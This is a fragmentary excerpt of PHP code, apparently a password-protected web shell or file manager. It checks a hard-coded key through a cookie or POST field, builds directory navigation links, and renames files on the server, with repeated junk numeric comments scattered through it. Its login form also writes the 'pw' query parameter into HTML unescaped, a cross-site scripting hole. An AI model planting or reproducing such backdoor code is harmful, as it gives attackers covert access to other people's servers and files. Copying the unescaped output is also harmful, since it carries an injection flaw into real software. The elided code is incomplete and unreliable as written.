...
$auth_key = "e5485c4260c6ccadd82bc757618de891";
...
$pass = false;
if (isset($_COOKIE['pw_name_16685'])) {
    if(($_COOKIE['pw_name_16685']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_16685'])) {
        if(($_POST['pw_name_16685']) == $auth_key) {
            setcookie("pw_name_16685", $_POST['pw_name_16685']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_16685' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726643960110242 1726643960833358 1726643960880331 1726643960155212
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726643960110242 1726643960833358 1726643960880331 1726643960155212
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726643960110242 1726643960833358 1726643960880331 1726643960155212
            $name = PATH . "/" . $_GET['r'];
